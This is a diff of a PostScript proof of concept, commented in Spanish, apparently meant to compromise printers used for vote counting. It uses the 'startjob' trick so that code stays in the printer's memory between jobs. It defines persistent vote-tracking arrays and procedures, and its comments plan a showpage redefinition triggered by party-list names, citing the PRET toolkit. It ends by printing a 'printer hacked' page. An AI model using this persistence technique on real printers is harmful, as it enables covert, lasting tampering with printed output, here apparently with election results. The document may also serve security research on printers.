@@ -1,5 +1,12 @@
-%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT
-%!
+%!PS-Adobe-3.0
+%%Creator: Ignacio E. Losiggio
+%%CreationDate: Wed Sep 20 15:29:00 2017
+%%Pages: 1
+%%DocumentData: Clean7Bit
+%%LanguageLevel: 2
+%%DocumentMedia: A4 595 842 0 () ()
+%%BoundingBox: 31 24 86 274
+%%EndComments
 
 % El trucazo para poder definir cosas en userdict y que queden entre impresiones
 true 0 startjob pop
@@ -11,11 +18,6 @@ true 0 startjob pop
   { (%Calendar%) currentdevparams /DateTime get }
   { (Not available) } ifelse
 } def
-
-
-% Al redefinir `showpage` hay que poner un valor magico para triggerear las acciones
-%/lista1 (PABLO LESCANO) def
-%/lista2 (MALAFAMA) def
 
 /cantvotos 300 def
 /currvoto 0 def % Las mesas no tienen mas de 400 votantes en general
@@ -33,7 +35,9 @@ true 0 startjob pop
   pushvoto % lo agrego a la lista
 } def
 
-
+% Al redefinir `showpage` hay que poner un valor magico para triggerear las acciones
+%/lista1 (PABLO LESCANO) def
+%/lista2 (MALAFAMA) def
 % Podría agregarse algo así a showpage
 % se tiene que construir un ataque similar al de https://github.com/RUB-NDS/PRET
 % los cambios no son duraderos dentro del job, así que tendría que imprimir y LUEGO
@@ -48,3 +52,22 @@ true 0 startjob pop
 %  systemdict /showpage get exec
 %} def
 
+% Imprimo algo
+false 0 startjob pop
+
+/ypos 800 def
+/newline {
+  100 ypos moveto
+  /ypos ypos 14 sub def
+} def
+
+/Courier findfont 12 scalefont setfont
+newline (Impresora kakeada) show
+newline (Creados:) show
+newline (    - /votos      (array))         show
+newline (    - /currvoto   (variable))      show
+newline (    - /cantvotos  (constante))     show
+newline (    - /sumarvoto  (procedimiento)) show
+newline (    - /pushvoto   (procedimiento)) show
+newline (    - /ahoramesmo (procedimiento)) show
+showpage
